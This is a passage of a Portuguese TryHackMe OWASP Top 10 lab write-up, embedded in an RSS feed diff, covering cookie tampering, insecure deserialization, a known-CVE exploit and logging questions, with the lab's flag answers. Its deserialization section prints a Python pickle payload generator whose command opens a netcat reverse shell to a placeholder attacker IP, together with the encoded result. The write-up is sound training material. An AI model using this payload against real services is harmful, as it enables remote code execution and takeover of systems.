+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/cookies-browser.webp&#34; alt=&#34;cookie browser&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;perguntas-10&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas-10&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas-10&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;1st flag (cookie value)&lt;/strong&gt;&lt;br&gt;
+Nossa primeira flag está no campo &lt;code&gt;sessionId&lt;/code&gt;, está encodada em base64.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mypc@mypc-MINI-S:~/Área de Trabalho$ echo -n &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAANjkxYWJiNjBhMzg1NDNlOWFlM2Y4M2ViYWM1NWJiYzBxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==&amp;#34;&lt;/span&gt; &amp;gt; sessionID
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mypc@mypc-MINI-S:~/Área de Trabalho$ base64 -d sessionID 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;�&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;X	sessionIdqX 691abb60a38543e9ae3f83ebac55bbc0qX                                                      encodedflagqXTHM&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;good_old_base64_huh&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;qu.mypc@mypc-MINI-S:~/Área de Trabalho&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Resposta: &lt;code&gt;THM{good_old_base64_huh}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2nd flag (admin dashboard)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Nossa segunda flag se encontra no painel de admin, para isso alteramos o campo &lt;code&gt;userType&lt;/code&gt; com valor &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/usertype.webp&#34; alt=&#34;usertype&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Resposta: &lt;code&gt;THM{heres_the_admin_flag}&lt;/code&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;execução-de-código&#34;&gt;Execução de código&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;execução-de-código&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#execu%c3%a7%c3%a3o-de-c%c3%b3digo&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Para esse exercício, primeiro precisamos voltar nosso campo userType para user. Depois, vamos clicar em Exchange your vim. Quando visitamos Exchange your vim, um cookie é codificado dentro de nosso navegador. Quando visitamos a página Provide your feedback!, esse mesmo cookie é decodificado e então desserializado.&lt;/p&gt;
+&lt;p&gt;Trecho do código que realiza o encode.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/encode.webp&#34; alt=&#34;encode&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;No trecho abaixo é mostrado o cookie sendo recuperado e desserializado.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/decode.webp&#34; alt=&#34;decode&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;A vulnerabilidade ocorre na biblioteca Pickle do Python. Resumidamente, criaremos um payload fornecido na aula, realizaremos o encode em base64 desse payload, que será utilizado no cookie que é recuperado e desserializado. Os dados não são verificados pela aplicação, dessa forma realizaremos uma conexão reversa.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pickle
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;command &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 | netcat YOUR_TRYHACKME_VPN_IP 4444 &amp;gt; /tmp/f&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rce&lt;/span&gt;(object):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__reduce__&lt;/span&gt;(self):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system,(command,))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(rce())))&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Alteramos o payload com nosso IP e executamos o arquivo &lt;code&gt;.py&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@ip-10-10-11-58:~# python3 pickleme.py 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gASVdAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFlybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTAuMTEuNTggNDQ0NCA+IC90bXAvZpSFlFKULg==&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Nosso payload está pronto, iremos coloca-lo no cookie &lt;code&gt;encodedPayload&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/payloadencodado.webp&#34; alt=&#34;payloadencodado&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Em nosso terminal novamente, abrimos nossa porta 4444, esperando pela conexão reversa, atualizando a página de feedback recebemos nossa conexão reversa.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/reverseshell.webp&#34; alt=&#34;shellreversa&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Nossa flag se encontra no diretório do usuário estamos logado.&lt;/p&gt;
+&lt;p&gt;Resposta:&lt;code&gt;4a69a7ff9fd68&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;componentes-com-vulnerabilidades-conhecidas&#34;&gt;Componentes com vulnerabilidades conhecidas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;componentes-com-vulnerabilidades-conhecidas&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#componentes-com-vulnerabilidades-conhecidas&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Vulnerabilidades que são conhecidas normalmente já são bem documentadas. Eventualmente, podem ser encontradas em bases de dados de exploit, como &lt;a
+    href=&#34;https://www.exploit-db.com/&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;exploit-db&lt;/a&gt;. Um exemplo de vulnerabilidade conhecida seria uma versão de Wordpress desatualizada. Com uma pesquisa rápida, é facilmente possível encontrar diversos exploits.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/nostromo.webp&#34; alt=&#34;nostromo&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;O exploit encontrado é referente ao &lt;code&gt;CVE-2019-16278&lt;/code&gt;. No exercício, é mostrado que durante a execução do exploit ocorre um erro. Esse erro serve para demonstrar, de forma prática, que haverá situações em que o usuário precisará modificar o código do exploit para obter resultados. Além disso, é uma boa prática ler o código, evitando assim sofrer um possível ataque.&lt;/p&gt;
+&lt;p&gt;O erro do exploit ocorre em uma linha que deveria ser comentada. Após isso, o código é executado normalmente.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/CVE-2019-16278.webp&#34; alt=&#34;CVE&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;laboratório&#34;&gt;Laboratório&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;laboratório&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#laborat%c3%b3rio&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Nesse laboratório é fornecido um website, uma loja de livros, onde podemos adicionar livros ao nosso carrinho e compra-los.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/bookstore.webp&#34; alt=&#34;bookstore&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Analisando o código fonte e a página inicial vemos um link para o site: &lt;code&gt;https://projectworlds.in/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Além disso, a página de acesso administrativo aparece o ano &lt;code&gt;2007&lt;/code&gt;. Realizando uma pesquisa sobre &lt;code&gt;Projectwordls exploit 2017&lt;/code&gt; encontramos o link abaixo, indicando que se trata de um exploit  utilizando em loja de livros online.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://www.exploit-db.com/exploits/47887&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Após copiar o exploit para nossa máquina e tentar executá-lo, ocorre um erro indicando que a variável não está definida no momento de obter a shell reversa. Antes de verificar o código, tentamos novamente executar com uma versão mais recente de Python e, assim, obtemos a shell reversa.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/shellreversa.webp&#34; alt=&#34;shell reversa&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Obtemos um RCE sem autenticação na aplicação.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;perguntas-11&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas-11&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas-11&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RCE $ wc -c /etc/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1611&lt;/span&gt; /etc/passwd&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Resposta:&lt;code&gt;1611&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;registro-e-monitoramento-insuficientes&#34;&gt;Registro e monitoramento insuficientes&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;registro-e-monitoramento-insuficientes&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#registro-e-monitoramento-insuficientes&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;A aplicação deve ser configurada para realizar a coleta (log) dos usuários que acessam. Quando ocorre um incidente, é através dos logs que será feito o rastreio das ações do atacante. Sem um monitoramento eficiente, há um grande risco de impacto, por exemplo:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Dano regulatório:&lt;/strong&gt; o atacante ganha acesso a informações pessoais dos usuários. Não apenas o usuário será afetado, mas também os proprietários da aplicação.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Risco do ataque avançar:&lt;/strong&gt; sem o monitoramento, o risco do atacante avançar com o ataque sem ser detectado é grande.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;nformações que log deveria incluir:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;HTTP Status code&lt;/li&gt;
+&lt;li&gt;Time Stamps&lt;/li&gt;
+&lt;li&gt;Usernames&lt;/li&gt;
+&lt;li&gt;API endpoints&lt;/li&gt;
+&lt;li&gt;IP address&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Exemplo de log fornecido pela aula.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/log.webp&#34; alt=&#34;log&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Esses logs contêm algumas informações confidenciais, por isso é importante garantir que eles sejam armazenados com segurança e que várias cópias deles sejam armazenadas em locais diferentes.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;perguntas-12&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas-12&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas-12&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;What IP address is the attacker using?&lt;/strong&gt;&lt;br&gt;
+Resposta: &lt;code&gt;49.99.13.16&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What kind of attack is being carried out?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;Brute Force&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;conclusão&#34;&gt;Conclusão&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;conclusão&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#conclus%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Nesta aula foram abordadas as 10 maiores vulnerabilidades listadas pela OWASP no ano de 2020, com uma introdução a cada vulnerabilidade que abrange conceitos teóricos e práticos, essenciais para o aprofundamento na exploração web.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+  </channel>
+</rss>
